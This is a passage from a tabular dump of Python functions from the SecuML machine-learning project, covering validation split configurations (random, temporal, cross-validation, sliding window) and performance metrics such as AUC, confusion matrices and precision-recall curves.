    return [('values', exportFieldMethod.primitive), ('sklearn_name', exportFieldMethod.primitive), ('best_value', exportFieldMethod.primitive)]"
ANSSI-FR/SecuML,get_factory,"def get_factory():
    global test_conf_factory
    if test_conf_factory is None:
        test_conf_factory = TestConfFactory()
    return test_conf_factory"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger):
    Conf.__init__(self, logger)
    self.method = None"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return ''"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    methods = get_factory().get_methods()
    validation_group = parser.add_argument_group('Validation parameters')
    validation_group.add_argument('--validation-mode', choices=methods, default='RandomSplit', help='Default: RandomSplit. TemporalSplit, CutoffTime, TemporalCv, and SlidingWindow require timestamped instances.')
    for method in methods:
        method_group = parser.add_argument_group(method + ' arguments')
        get_factory().gen_parser(method, method_group)"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('method', exportFieldMethod.primitive)]"
ANSSI-FR/SecuML,gen_datasets,"def gen_datasets(self, classifier_conf, instances):
    (train, test) = self._gen_train_test(classifier_conf, instances)
    return Datasets(train, test)"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, num_folds):
    TestConf.__init__(self, logger)
    self.num_folds = num_folds"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = TestConf.fields_to_export(self)
    fields.extend([('num_folds', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_datasets,"def gen_datasets(self, classifier_conf, instances, cv=None):
    if cv is not None:
        cv_split = cv
    else:
        cv_split = self._gen_cv_split(classifier_conf, instances)
    cv_datasets = CvDatasets()
    for (fold_id, (train_ids, test_ids)) in enumerate(cv_split):
        train_instances = instances.get_from_ids(train_ids)
        test_instances = instances.get_from_ids(test_ids)
        cv_datasets.add_dataset(Datasets(train_instances, test_instances))
    return cv_datasets"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, cutoff_time):
    OneFoldTestConf.__init__(self, logger)
    self.method = 'cutoff_time'
    self.cutoff_time = cutoff_time"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return '_Test_CuttOffTime_%s%s' % (str(self.cutoff_time), OneFoldTestConf.get_exp_name(self))"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = OneFoldTestConf.fields_to_export(self)
    fields.extend([('cutoff_time', exportFieldMethod.string)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--cutoff-time', type=valid_date, help='Cutoff time. Format: YYYY-MM-DD HH:MM:SS. ')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return CutoffTimeConf(logger, args.cutoff_time)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return CutoffTimeConf(logger, obj['cutoff_time'])"
ANSSI-FR/SecuML,_gen_train_test,"def _gen_train_test(self, classifier_conf, instances):
    train = instances.ids.get_ids_before(self.cutoff_time)
    test = instances.ids.get_ids_after(self.cutoff_time)
    train_instances = instances.get_from_ids(train)
    test_instances = instances.get_from_ids(test)
    return (train_instances, test_instances)"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, num_folds):
    SeveralFoldsTestConf.__init__(self, logger, num_folds)
    self.method = 'cv'"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = '__Test_Cv_%d' % self.num_folds
    name += SeveralFoldsTestConf.get_exp_name(self)
    return name"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--num-folds-val', type=int, default=4, help='Number of cross validation folds. Default: 4.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return CvConf(logger, args.num_folds_val)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return CvConf(logger, obj['num_folds'])"
ANSSI-FR/SecuML,_gen_cv_split,"def _gen_cv_split(self, classifier_conf, instances):
    supervision = classifier_conf.get_supervision(instances)
    if any((l is None for l in supervision)):
        cv = KFold(n_splits=self.num_folds)
    else:
        cv = StratifiedKFold(n_splits=self.num_folds)
    split = cv.split(instances.features.get_values(), supervision)
    cv_split = np.full((self.num_folds,), None)
    for (i, (train_indexes, test_indexes)) in enumerate(split):
        train_ids = instances.ids.ids[train_indexes]
        test_ids = instances.ids.ids[test_indexes]
        cv_split[i] = (train_ids, test_ids)
    return cv_split"
ANSSI-FR/SecuML,_get_train_test_ids,"def _get_train_test_ids(ids, test_size):
    msk = np.random.rand(len(ids)) < 1 - test_size
    train = []
    test = []
    for i in range(len(msk)):
        instance_id = ids[i]
        if msk[i]:
            train.append(instance_id)
        else:
            test.append(instance_id)
    return (train, test)"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, test_size):
    OneFoldTestConf.__init__(self, logger)
    self.method = 'random_split'
    self.test_size = test_size"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return '__Test_RandomSplit_%s_%s' % (to_percentage(self.test_size), OneFoldTestConf.get_exp_name(self))"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = OneFoldTestConf.fields_to_export(self)
    fields.extend([('test_size', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--test-size', type=float, default=0.1, help='Pourcentage of the training data selected for validation. Default: 0.1')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return RandomSplitConf(logger, args.test_size)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return RandomSplitConf(logger, obj['test_size'])"
ANSSI-FR/SecuML,_gen_train_test,"def _gen_train_test(self, classifier_conf, instances):
    (train, test) = _get_train_test_ids(instances.ids.get_ids(), self.test_size)
    train_instances = instances.get_from_ids(train)
    test_instances = instances.get_from_ids(test)
    return (train_instances, test_instances)"
ANSSI-FR/SecuML,_compute_num_folds,"def _compute_num_folds(num_buckets, num_train_buckets, num_test_buckets):
    r = num_buckets
    r -= num_train_buckets + num_test_buckets
    r += 1
    return r"
ANSSI-FR/SecuML,_gen_sliding_windows,"def _gen_sliding_windows(t_start, num_train_buckets, num_test_buckets, delta):
    train_start = t_start
    train_end = train_start + num_train_buckets * delta
    test_start = train_end
    test_end = test_start + num_test_buckets * delta
    return (train_start, train_end, test_start, test_end)"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, num_buckets, num_train_buckets, num_test_buckets):
    num_folds = _compute_num_folds(num_buckets, num_train_buckets, num_test_buckets)
    SeveralFoldsTestConf.__init__(self, logger, num_folds)
    self.method = 'sliding_window'
    self.num_buckets = num_buckets
    self.num_train_buckets = num_train_buckets
    self.num_test_buckets = num_test_buckets"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    buckets = [self.num_buckets, self.num_train_buckets, self.num_test_buckets]
    buckets = '_'.join(map(str, buckets))
    name = '__Test_SlidingWindow_' + buckets
    name += SeveralFoldsTestConf.get_exp_name(self)
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = SeveralFoldsTestConf.fields_to_export(self)
    fields.extend([('num_buckets', exportFieldMethod.primitive), ('num_train_buckets', exportFieldMethod.primitive), ('num_test_buckets', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--num-buckets', type=int, default=10, help='Number of buckets. Default: 10.')
    parser.add_argument('--num-train-buckets', type=int, default=4, help='Number of train buckets. Default: 4.')
    parser.add_argument('--num-test-buckets', type=int, default=1, help='Number of test buckets. Default: 1.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return SlidingWindowConf(logger, args.num_buckets, args.num_train_buckets, args.num_test_buckets)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return SlidingWindowConf(logger, obj['num_buckets'], obj['num_train_buckets'], obj['num_test_buckets'])"
ANSSI-FR/SecuML,_gen_cv_split,"def _gen_cv_split(self, classifier_conf, instances):
    (t_indexes, t_start, t_end) = instances.get_sorted_timestamps()
    delta = (t_end - t_start) / self.num_buckets
    cv_split = [None for _ in range(self.num_folds)]
    start = t_start
    for i in range(self.num_folds):
        (train_start, train_end, test_start, test_end) = _gen_sliding_windows(start, self.num_train_buckets, self.num_test_buckets, delta)
        train = instances.ids.get_ids_between(train_start, train_end)
        test = instances.ids.get_ids_between(test_start, test_end)
        cv_split[i] = (train, test)
        start += delta
    return cv_split"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, num_folds):
    SeveralFoldsTestConf.__init__(self, logger, num_folds)
    self.method = 'temporal_cv'"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = '__Test_TemporalCv_%d' % self.num_folds
    name += SeveralFoldsTestConf.get_exp_name(self)
    return name"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return TemporalCvConf(logger, obj['num_folds'])"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--num-folds-val-temp', type=int, default=4, help='Number of cross validation folds. Default: 4.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return TemporalCvConf(logger, args.num_folds_val_temp)"
ANSSI-FR/SecuML,_gen_cv_split,"def _gen_cv_split(self, classifier_conf, instances):
    (t_indexes, t_start, t_end) = instances.get_sorted_timestamps()
    num_buckets = self.num_folds + 1
    delta = (t_end - t_start) / num_buckets
    cv_split = [None for _ in range(self.num_folds)]
    cutoff_time = t_start + delta
    for i in range(self.num_folds):
        train = instances.ids.get_ids_before(cutoff_time)
        test = instances.ids.get_ids_between(cutoff_time, cutoff_time + delta)
        cv_split[i] = (train, test)
        cutoff_time += delta
    return cv_split"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, test_size):
    OneFoldTestConf.__init__(self, logger)
    self.method = 'temporal_split'
    self.test_size = test_size"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return '__Test_TemporalSplit_%s_%s' % (to_percentage(self.test_size), OneFoldTestConf.get_exp_name(self))"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = OneFoldTestConf.fields_to_export(self)
    fields.extend([('test_size', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--test-size-temp', type=float, default=0.1, help='Pourcentage of the training data selected for validation. Default: 0.1')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return TemporalSplitConf(logger, args.test_size_temp)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return TemporalSplitConf(logger, obj['test_size'])"
ANSSI-FR/SecuML,_gen_train_test,"def _gen_train_test(self, classifier_conf, instances):
    timestamps = instances.ids.timestamps
    ids = instances.ids.ids
    t_ids = list(zip(timestamps, ids))
    t_ids.sort()
    num_train = int(len(t_ids) * (1 - self.test_size))
    train = [i for (t, i) in t_ids[:num_train]]
    test = [i for (t, i) in t_ids[num_train:]]
    train_instances = instances.get_from_ids(train)
    test_instances = instances.get_from_ids(test)
    return (train_instances, test_instances)"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger):
    OneFoldTestConf.__init__(self, logger)
    self.method = 'unlabeled'"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = '__UnlabeledLabeled'
    name += OneFoldTestConf.get_exp_name(self)
    return name"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    return"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return UnlabeledLabeledConf(logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return UnlabeledLabeledConf(logger)"
ANSSI-FR/SecuML,_gen_train_test,"def _gen_train_test(self, classifier_conf, instances):
    classifier_type = get_classifier_type(classifier_conf.__class__)
    if classifier_type == ClassifierType.supervised:
        train_instances = instances.get_annotated_instances()
    else:
        train_instances = instances
    test_instances = instances.get_unlabeled_instances()
    return (train_instances, test_instances)"
ANSSI-FR/SecuML,__init__,"def __init__(self, message):
    self.message = message"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return self.message"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, validation_datasets, streaming, stream_batch):
    OneFoldTestConf.__init__(self, logger)
    self.method = 'datasets'
    self.validation_datasets = validation_datasets
    self.streaming = streaming
    self.stream_batch = stream_batch"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = '__Test_Datasets_%s' % '_'.join(self.validation_datasets)
    if self.streaming:
        name += '__streaming_Batch_%i' % self.stream_batch
    name += OneFoldTestConf.get_exp_name(self)
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = OneFoldTestConf.fields_to_export(self)
    fields.extend([('validation_datasets', exportFieldMethod.primitive)])
    fields.extend([('streaming', exportFieldMethod.primitive)])
    fields.extend([('stream_batch', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--validation-datasets', default=None, nargs='+', help='Name(s) of the validation dataset(s).')
    parser.add_argument('--streaming', default=False, action='store_true', help='When specified, the validation datasets are processed as a stream. In this case, alerts analyses are not available. ')
    parser.add_argument('--stream-batch', default=1000, type=int, help='Size of the streaming batches. Default: 1000.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    if len(set(args.validation_datasets)) < len(args.validation_datasets):
        raise InvalidValidationDatasets('--validation-datasets contains duplicates.')
    return ValidationDatasetsConf(logger, args.validation_datasets, args.streaming, args.stream_batch)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return ValidationDatasetsConf(logger, obj['validation_datasets'], obj['streaming'], obj['stream_batch'])"
ANSSI-FR/SecuML,_gen_train_test,"def _gen_train_test(self, classifier_conf, instances):
    return (instances, None)"
ANSSI-FR/SecuML,__init__,"def __init__(self, features_info, class_label, num_folds=1):
    self.class_label = class_label
    self.fold_coef = pd.DataFrame(np.zeros((num_folds, features_info.num_features())), index=['f_%d' % x for x in range(num_folds)], columns=features_info.ids)"
ANSSI-FR/SecuML,add_fold,"def add_fold(self, coef, fold_id=0):
    self.fold_coef.iloc[fold_id, :] = coef"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):
    features = self.fold_coef.columns
    mean = self.fold_coef.mean(axis=0)
    abs_mean = list(map(abs, mean))
    std = self.fold_coef.std(axis=0)
    zscore = abs(mean / [1e-05 if x == 0 else x for x in std])
    self.coef_summary = pd.DataFrame({'mean': mean, 'std': std, 'Zscore': zscore, 'abs_mean': abs_mean}, index=features)
    sort_data_frame(self.coef_summary, 'abs_mean', False, True)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    self.final_computations()
    if self.class_label is None:
        filename = 'model_coefficients.csv'
    else:
        filename = 'model_coefficients_%s.csv' % self.class_label
    with open(path.join(directory, filename), 'w') as f:
        self.coef_summary.to_csv(f, index_label='feature')"
ANSSI-FR/SecuML,__init__,"def __init__(self, features_info, class_labels, num_folds=1):
    self.class_labels = class_labels
    self._init_class_coefficients(features_info, num_folds)"
ANSSI-FR/SecuML,add_fold,"def add_fold(self, coef, fold_id=0):
    if self.class_labels is None:
        self.coefficients.add_fold(coef, fold_id=fold_id)
    else:
        if len(self.class_labels) == 2:
            coef = np.vstack((coef, -coef[0]))
        for (i, class_label) in enumerate(self.class_labels):
            self.coefficients[class_label].add_fold(coef[i], fold_id=fold_id)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    if self.class_labels is None:
        self.coefficients.display(directory)
    else:
        for (_, coefficients) in self.coefficients.items():
            coefficients.display(directory)"
ANSSI-FR/SecuML,_init_class_coefficients,"def _init_class_coefficients(self, features_info, num_folds):
    if self.class_labels is None:
        self.coefficients = ClassCoefficients(features_info, None, num_folds=num_folds)
    else:
        self.coefficients = {label: ClassCoefficients(features_info, label, num_folds=num_folds) for label in self.class_labels}"
ANSSI-FR/SecuML,__init__,"def __init__(self, num_folds=1):
    self.num_folds = num_folds
    self.pred_info = None
    self.perf_indicators = None
    self.confusion_matrix = None
    self.roc = None
    self.fdr_tpr_curve = None"
ANSSI-FR/SecuML,init,"def init(self, predictions):
    self.pred_info = predictions.info
    if self.pred_info.multiclass:
        self.perf_indicators = MulticlassIndicators(self.num_folds)
    else:
        self.perf_indicators = BinaryIndicators(self.num_folds, self.pred_info.with_probas, self.pred_info.with_scores)
        self.confusion_matrix = ConfusionMatrix()
        if self.pred_info.with_probas or self.pred_info.with_scores:
            self.roc = RocCurve(self.num_folds, self.pred_info.with_probas)
            self.fdr_tpr_curve = FdrTprCurve(self.num_folds, self.pred_info.with_probas)"
ANSSI-FR/SecuML,add_fold,"def add_fold(self, predictions, fold_id=0):
    if self.pred_info is None:
        self.init(predictions)
    elif not self.pred_info.equal(predictions.info):
        raise InconsistentPredictions()
    self.perf_indicators.add_fold(fold_id, predictions)
    if not self.pred_info.multiclass:
        self.confusion_matrix.add_fold(predictions)
        if self.roc is not None:
            self.roc.add_fold(fold_id, predictions)
        if self.fdr_tpr_curve is not None:
            self.fdr_tpr_curve.add_fold(fold_id, predictions)"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):
    self.perf_indicators.final_computations()"
ANSSI-FR/SecuML,display,"def display(self, directory):
    with open(path.join(directory, 'perf_indicators.json'), 'w') as f:
        self.perf_indicators.to_json(f)
    if not self.pred_info.multiclass:
        self.confusion_matrix.display(directory)
        if self.roc is not None:
            self.roc.display(directory)
        if self.fdr_tpr_curve is not None:
            self.fdr_tpr_curve.display(directory)"
ANSSI-FR/SecuML,__init__,"def __init__(self, num_folds, probabilist, with_scoring, auc=True):
    self.probabilist = probabilist
    self.with_scoring = with_scoring
    self.auc = auc
    self.num_folds = num_folds
    if self.auc:
        self.fold_auc = [0] * num_folds
    if self.probabilist:
        self.thresholds = list(range(101))
        self.columns = ['precision', 'recall', 'far', 'false_positive', 'f-score']
        self.fold_perf = [np.zeros((num_folds, len(self.columns))) for x in self.thresholds]
    else:
        self.columns = ['precision', 'recall', 'far', 'false_positive', 'f-score', 'accuracy']
        self.fold_perf = np.zeros((num_folds, len(self.columns)))"
ANSSI-FR/SecuML,add_fold,"def add_fold(self, fold_id, predictions):
    if self.auc:
        self.add_auc(fold_id, predictions)
    if self.probabilist:
        self.add_proba_fold(fold_id, predictions, threshold=None)
    else:
        self.add_non_proba_fold(fold_id, predictions)"
ANSSI-FR/SecuML,add_auc,"def add_auc(self, fold_id, predictions):
    if self.probabilist:
        scores = predictions.probas
    else:
        scores = predictions.scores
    if not self.probabilist and (not self.with_scoring):
        roc_auc = 0
    elif predictions.num_instances() == 0 or sum(predictions.ground_truth) == 0:
        roc_auc = 0
    else:
        (fpr, tpr, thresholds) = roc_curve(predictions.ground_truth, scores)
        roc_auc = auc(fpr, tpr)
        if math.isnan(roc_auc):
            roc_auc = 0
    self.fold_auc[fold_id] = roc_auc"
ANSSI-FR/SecuML,compute_precision_recall_fscore,"def compute_precision_recall_fscore(self, ground_truth, predictions):
    (precision, recall, f_score, _) = precision_recall_fscore_support(ground_truth, predictions, average='binary', warn_for=())
    return (precision, recall, f_score)"
ANSSI-FR/SecuML,compute_fpr,"def compute_fpr(self, ground_truth, predictions):
    if len(predictions) == 0:
        fp = 0
        tn = 0
    else:
        conf_matrix = confusion_matrix(ground_truth, predictions, [True, False])
        fp = conf_matrix[1][0]
        tn = conf_matrix[1][1]
    fp_tn = fp + tn
    if fp_tn == 0:
        false_positive_rate = 0
    else:
        false_positive_rate = fp / (fp + tn)
    return false_positive_rate"
ANSSI-FR/SecuML,add_proba_fold,"def add_proba_fold(self, fold_id, predictions, threshold=None):
    if threshold is None:
        for threshold in self.thresholds:
            self.add_proba_fold(fold_id, predictions, threshold=threshold)
    else:
        probas = predictions.probas
        predicted_labels = np.array(probas) > threshold / 100
        (precision, recall, f_score) = self.compute_precision_recall_fscore(predictions.ground_truth, predicted_labels)
        false_positive_rate = self.compute_fpr(predictions.ground_truth, predicted_labels)
        self.fold_perf[threshold][fold_id, :] = [precision, recall, 1 - precision, false_positive_rate, f_score]"
ANSSI-FR/SecuML,add_non_proba_fold,"def add_non_proba_fold(self, fold_id, predictions):
    (precision, recall, f_score) = self.compute_precision_recall_fscore(predictions.ground_truth, predictions.values)
    accuracy = accuracy_score(predictions.ground_truth, predictions.values)
    fpr = self.compute_fpr(predictions.ground_truth, predictions.values)
    self.fold_perf[fold_id, :] = [precision, recall, 1 - precision, fpr, f_score, accuracy]"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):
    if self.auc:
        self.auc_mean = np.mean(self.fold_auc)
        self.auc_std = np.std(self.fold_auc)
    if self.probabilist:
        self.fold_perf = [pd.DataFrame(self.fold_perf[x], index=['f_' + str(x) for x in range(self.num_folds)], columns=self.columns) for x in self.thresholds]
        indicators = self.fold_perf[0].columns
        columns = ['mean', 'std']
        n_indicators = len(indicators)
        n_columns = len(columns)
        self.perf_threshold_summary = [pd.DataFrame(np.zeros((n_indicators, n_columns)), columns=columns, index=indicators) for x in self.thresholds]
        for threshold in self.thresholds:
            if self.num_folds > 1:
                mean_perf = self.fold_perf[threshold].mean(axis=0)
                std_perf = self.fold_perf[threshold].std(axis=0)
            else:
                mean_perf = self.fold_perf[threshold].iloc[0,]
                std_perf = [0] * len(indicators)
            self.perf_threshold_summary[threshold]['mean'] = mean_perf
            self.perf_threshold_summary[threshold]['std'] = std_perf
    else:
        self.fold_perf = pd.DataFrame(self.fold_perf, index=['f_' + str(x) for x in range(self.num_folds)], columns=self.columns)
        indicators = self.fold_perf.columns
        columns = ['mean', 'std']
        n_indicators = len(indicators)
        n_columns = len(columns)
        self.perf_threshold_summary = pd.DataFrame(np.zeros((n_indicators, n_columns)), columns=columns, index=indicators)
        if self.num_folds > 1:
            mean_perf = self.fold_perf.mean(axis=0)
            std_perf = self.fold_perf.std(axis=0)
        else:
            mean_perf = self.fold_perf.iloc[0,]
            std_perf = [0] * len(indicators)
        self.perf_threshold_summary['mean'] = mean_perf
        self.perf_threshold_summary['std'] = std_perf"
ANSSI-FR/SecuML,get_perf_estimator,"def get_perf_estimator(self, estimator, threshold=50):
    if self.probabilist:
        return self.perf_threshold_summary[threshold].loc[estimator, 'mean']
    else:
        return self.perf_threshold_summary.loc[estimator, 'mean']"
ANSSI-FR/SecuML,get_auc,"def get_auc(self):
    return self.auc_mean"
ANSSI-FR/SecuML,get_csv_header,"def get_csv_header(self):
    return ['auc', 'fscore', 'precision', 'recall']"
ANSSI-FR/SecuML,get_csv_line,"def get_csv_line(self):
    return [self.get_auc(), self.get_perf_estimator('f-score'), self.get_perf_estimator('precision'), self.get_perf_estimator('recall')]"
ANSSI-FR/SecuML,to_json,"def to_json(self, f):
    perf = {}
    if self.auc:
        perf['auc'] = {'mean': to_percentage(self.auc_mean), 'std': trunc(self.auc_std)}
    if self.probabilist:
        perf['thresholds'] = [{} for x in self.thresholds]
        for t in self.thresholds:
            summary = self.perf_threshold_summary[t]
            for v in summary.index:
                perf['thresholds'][t][v] = {}
                perf['thresholds'][t][v]['mean'] = to_percentage(summary.loc[v, 'mean'])
                perf['thresholds'][t][v]['std'] = trunc(summary.loc[v, 'std'])
    else:
        for v in self.perf_threshold_summary.index:
            perf[v] = {}
            perf[v]['mean'] = to_percentage(self.perf_threshold_summary.loc[v, 'mean'])
            perf[v]['std'] = trunc(self.perf_threshold_summary.loc[v, 'std'])
    json.dump(perf, f, indent=2)"
ANSSI-FR/SecuML,__init__,"def __init__(self):
    self.confusion_matrix = np.zeros((2, 2))"
ANSSI-FR/SecuML,add_fold,"def add_fold(self, predictions):
    if predictions.num_instances() > 0:
        conf_matrix = confusion_matrix(predictions.ground_truth, predictions.values, [True, False])
        self.confusion_matrix += conf_matrix"
ANSSI-FR/SecuML,get_true_positives,"def get_true_positives(self):
    return self.confusion_matrix[0][0]"
ANSSI-FR/SecuML,get_true_negatives,"def get_true_negatives(self):
    return self.confusion_matrix[1][1]"
ANSSI-FR/SecuML,get_false_positives,"def get_false_positives(self):
    return self.confusion_matrix[1][0]"
ANSSI-FR/SecuML,get_false_negatives,"def get_false_negatives(self):
    return self.confusion_matrix[0][1]"
ANSSI-FR/SecuML,display_matrix,"def display_matrix(self, f):
    json.dump({'TP': self.get_true_positives(), 'TN': self.get_true_negatives(), 'FP': self.get_false_positives(), 'FN': self.get_false_negatives()}, f, indent=2)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    with open(path.join(directory, 'confusion_matrix.json'), 'w') as f:
        self.display_matrix(f)"
ANSSI-FR/SecuML,interp_recall,"def interp_recall(ground_truth, scores, precision_sample):
    (precision, recall, thresholds) = precision_recall_curve(ground_truth, scores)
    thresholds = np.append(thresholds, 1)
    thresholds = np.append(0, thresholds)
    precision = np.append(sum(ground_truth) / len(ground_truth), precision)
    recall = np.append(1, recall)
    recall = interp(precision_sample, precision, recall)
    thresholds = interp(precision_sample, precision, thresholds)
    return (recall, thresholds)"
ANSSI-FR/SecuML,__init__,"def __init__(self, num_folds, probabilist):
    self.mean_recall = None
    self.mean_precision = np.linspace(0, 1, 101)
    self.thresholds = None
    (self.fig, self.ax1) = plt.subplots(1, 1)
    self.probabilist = probabilist
    self.num_folds = num_folds"
ANSSI-FR/SecuML,add_fold,"def add_fold(self, fold_id, predictions):
    if predictions.num_instances() == 0 or sum(predictions.ground_truth) == 0:
        return
    if self.probabilist:
        scores = predictions.probas
    else:
        scores = predictions.scores
    (recall, thresholds) = interp_recall(predictions.ground_truth, scores, self.mean_precision)
    if self.mean_recall is None:
        self.mean_recall = recall
    else:
        self.mean_recall += recall
    if self.num_folds > 1:
        self.ax1.plot(1 - self.mean_precision, recall, lw=1, label='FAR/DR fold %d' % fold_id)
    else:
        self.ax1.plot(1 - self.mean_precision, recall, lw=3, color=get_label_color('all'), label='FAR/DR')
    return (1 - self.mean_precision, recall)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    self.plot(path.join(directory, 'false_discovery_recall_curve.png'))
    self.to_csv(path.join(directory, 'false_discovery_recall_curve.csv'))"
ANSSI-FR/SecuML,plot,"def plot(self, output_file):
    if self.num_folds > 1:
        self.mean_recall /= self.num_folds
        self.ax1.plot(1 - self.mean_precision, self.mean_recall, 'k--', label='Mean FAR/DR', lw=2)
    self.ax1.set_xlim([-0.05, 1.05])
    self.ax1.set_ylim([-0.05, 1.05])
    self.ax1.set_xlabel('False Alarm Rate (1 - Precision)')
    self.ax1.set_ylabel('Detection Rate (Recall)')
    self.ax1.set_title('False Alarm Rate / Detection Rate Curve')
    self.ax1.legend(loc='lower right')
    self.fig.savefig(output_file)
    plt.close(self.fig)"
ANSSI-FR/SecuML,to_csv,"def to_csv(self, output_file):
    with open(output_file, 'w') as f:
        csv_writer = csv.writer(f)
        header = ['Threshold', 'Precision', 'Recall']
        csv_writer.writerow(header)
        if self.thresholds is None:
            return
        for i in range(len(self.mean_precision)):
            row = [self.thresholds[i], self.mean_precision[i], self.mean_recall[i]]
            csv_writer.writerow(row)"
ANSSI-FR/SecuML,__init__,"def __init__(self, num_folds):
    self.num_folds = num_folds
    self.accuracy = [0] * num_folds
    self.f1_micro = [0] * num_folds
    self.f1_macro = [0] * num_folds"
ANSSI-FR/SecuML,add_fold,"def add_fold(self, fold_id, predictions):
    self._set_fscores(fold_id, predictions)
    self._set_accuracy(fold_id, predictions)"
ANSSI-FR/SecuML,get_accuracy,"def get_accuracy(self):
    return self.accuracy_mean"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):
    self.accuracy_mean = np.mean(self.accuracy)
    self.accuracy_std = np.std(self.accuracy)
    self.f1_micro_mean = np.mean(self.f1_micro)
    self.f1_micro_std = np.std(self.f1_micro)
    self.f1_macro_mean = np.mean(self.f1_macro)
    self.f1_macro_std = np.std(self.f1_macro)"
ANSSI-FR/SecuML,to_json,"def to_json(self, f):
    perf = {}
    perf['accuracy'] = {'mean': to_percentage(self.accuracy_mean), 'std': trunc(self.accuracy_std)}
    perf['f1_micro'] = {'mean': to_percentage(self.f1_micro_mean), 'std': trunc(self.f1_micro_std)}
    perf['f1_macro'] = {'mean': to_percentage(self.f1_macro_mean), 'std': trunc(self.f1_macro_std)}
    json.dump(perf, f, indent=2)"
ANSSI-FR/SecuML,get_csv_header,"def get_csv_header(self):
    return ['accuracy', 'f1-micro', 'f1-macro']"
ANSSI-FR/SecuML,get_csv_line,"def get_csv_line(self):
    return [self.accuracy_mean, self.f1_micro_mean, self.f1_macro_mean]"
ANSSI-FR/SecuML,_set_fscores,"def _set_fscores(self, fold_id, predictions):
    diff = set(predictions.ground_truth) - set(predictions.values)
    if predictions.num_instances() > 0 and len(diff) == 0:
        self.f1_micro[fold_id] = f1_score(predictions.ground_truth, predictions.values, average='micro')
        self.f1_macro[fold_id] = f1_score(predictions.ground_truth, predictions.values, average='macro')
    else:
        self.f1_micro[fold_id] = 0
        self.f1_macro[fold_id] = 0"
ANSSI-FR/SecuML,_set_accuracy,"def _set_accuracy(self, fold_id, predictions):
    if predictions.num_instances() == 0:
        self.accuracy[fold_id] = 0
    else:
        self.accuracy[fold_id] = accuracy_score(predictions.ground_truth, predictions.values)"
ANSSI-FR/SecuML,__init__,"def __init__(self, num_folds, probabilist):
    self.mean_tpr = None
    self.mean_fpr = np.linspace(0, 1, 101)
    self.thresholds = None
    (self.fig, self.ax1) = plt.subplots(1, 1)
    self.probabilist = probabilist
    self.num_folds = num_folds"
